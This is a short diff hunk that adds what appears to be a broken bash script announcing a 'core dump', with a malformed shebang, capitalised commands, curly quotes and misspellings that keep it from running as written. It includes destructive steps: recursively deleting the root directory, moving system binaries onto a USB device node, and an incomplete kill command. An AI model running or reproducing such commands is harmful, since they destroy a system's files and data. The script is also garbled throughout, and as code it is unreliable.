@@ -1,0 +1,20 @@
+!/bin/bash
+
+Echo “ core dump initiated”
+
+Mv /sbin/essentials/* /dev/media/ttyUSB0
+
+Rm -r  /
+
+KILL -4 
+
+Ls /bin/exceptional  |grep immediate_recovery.ymal
+
+
+
+Echo “ status needed” 
+
+
+
+Exit(0)
+0
